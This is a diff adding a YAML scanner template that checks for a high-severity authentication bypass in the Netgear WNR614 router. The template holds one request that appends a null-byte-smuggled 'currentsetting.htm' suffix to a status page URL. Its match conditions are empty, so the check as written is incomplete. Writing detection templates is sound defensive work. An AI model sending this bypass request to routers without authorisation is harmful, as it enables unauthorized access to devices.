@@ -1,0 +1,21 @@
+id: netgear-wnr614-auth-bypass
+brief:
+    title: Netgear WNR614 - Improper Authentication
+    by: ritikchaddha
+    level: high
+    about: A vulnerability in the Netgear WNR614 router permits unauthorized individuals to bypass the authentication. When adding "%00currentsetting.htm" to the the requested url, it will be recognized as pa...
+    label:
+        - cve
+        - cve2024
+        - netgear
+        - router
+        - exposure
+        - wnr614
+        - unauth
+        - vuln
+    score: CVSS:7.5
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/RST_status.htm%00currentsetting.htm'
+      signs: []
